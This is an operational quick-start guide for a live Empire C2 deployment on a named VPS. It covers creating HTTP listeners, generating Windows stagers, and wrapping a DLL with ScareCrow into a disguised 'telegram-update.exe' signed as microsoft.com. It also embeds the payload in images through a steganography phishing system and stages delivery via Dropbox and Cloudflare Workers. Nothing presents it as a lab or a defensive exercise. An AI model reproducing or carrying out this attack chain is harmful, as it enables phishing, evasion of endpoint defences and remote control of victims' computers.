# 🚀 Empire C2 - QUICK START GUIDE

## ✅ CURRENT STATUS (WORKING!)

- **Empire Server**: Running locally in Docker
- **Starkiller UI**: https://161-35-155-3.sslip.io ✅
- **Empire API**: http://127.0.0.1:1337 (forwarded to VPS)
- **SSH Tunnels**: Active and working

## 🌐 ACCESS POINTS

### Starkiller Web UI
```
URL: https://161-35-155-3.sslip.io
```

### Empire API (Local)
```
URL: http://127.0.0.1:1337/api/v2/
```

### Empire API (Via VPS)
```
URL: https://161-35-155-3.sslip.io/api/
Auth: Basic Auth (configured in nginx)
```

## 🔧 EMPIRE COMMANDS

### Access Empire CLI
```bash
# Enter Docker container
docker exec -it empire bash

# Inside container, start Empire CLI
cd /opt/Empire
python3 empire.py client
```

### Check Empire Status
```bash
# Check if Empire is running
docker ps | grep empire

# Check Empire logs
docker logs empire

# Restart Empire
docker restart empire
```

## 📡 CREATE LISTENERS

```python
# Access Empire client
docker exec -it empire python3 /opt/Empire/empire.py client

# Once in Empire CLI:
uselistener http
set Name main_listener
set Host https://161-35-155-3.sslip.io
set Port 443
set DefaultProfile /admin/get.php,/news.php,/login/process.php|Mozilla/5.0
execute

# Verify
listeners
```

## 🎯 GENERATE STAGERS

```python
# Windows PowerShell Stager
usestager windows/launcher_bat
set Listener main_listener
set OutFile /tmp/launcher.bat
execute

# Windows DLL (for ScareCrow)
usestager windows/dll
set Listener main_listener  
set OutFile /tmp/empire.dll
execute

# Copy from container to host
```

```bash
# From host (outside container)
docker cp empire:/tmp/launcher.bat ./stagers/
docker cp empire:/tmp/empire.dll ./stagers/
```

## 🔐 DEFAULT CREDENTIALS

Check inside Empire container:
```bash
docker exec -it empire cat /root/.local/share/powershell-empire/config.yaml | grep -A 5 defaults
```

## 🛠️ TROUBLESHOOTING

### Starkiller Won't Load
```bash
# Check nginx on VPS
ssh root@161.35.155.3 "systemctl status nginx"

# Check SSH tunnels are running
ps aux | grep "ssh.*1337"
```

### Empire API Not Responding
```bash
# Check Empire is running
docker ps | grep empire

# Check logs
docker logs empire --tail 50

# Restart if needed
docker restart empire
```

### Can't Connect to Listeners
```bash
# Verify listener is active in Empire
docker exec -it empire python3 /opt/Empire/empire.py client
# Then: listeners

# Check firewall on VPS
ssh root@161.35.155.3 "ufw status"
```

## ⚡ QUICK ACTIONS

### Create Complete Attack Chain
```bash
# 1. Create listener (see above)
# 2. Generate DLL stager
# 3. Process with ScareCrow
cd /home/kali/ScareCrow
./ScareCrow -I ./stagers/empire.dll -Loader binary -domain microsoft.com -O payloads/telegram-update.exe

# 4. Embed in image
cd /home/kali/Main\ C2\ Framework/advanced-steganography-phishing
python3 large-stego-system.py embed --payload payloads/telegram-update.exe --output output/

# 5. Upload to Dropbox
# 6. Update Cloudflare Worker URLs
# 7. Test!
```

## 📱 USEFUL COMMANDS

```bash
# Check what's running on ports
netstat -tulpn | grep -E '1337|5000'

# Check Docker containers
docker ps -a

# View Empire logs live
docker logs -f empire

# SSH to VPS
ssh root@161.35.155.3

# Check SSH tunnels
ps aux | grep ssh | grep 1337
```

## 🎯 NEXT STEPS

1. ✅ Empire is running
2. ✅ Starkiller is accessible
3. ⏳ Create HTTP/HTTPS listeners
4. ⏳ Generate stagers
5. ⏳ Integrate with ScareCrow
6. ⏳ Test agent check-in

---

**Everything is ready to go - just create listeners and stagers now!**
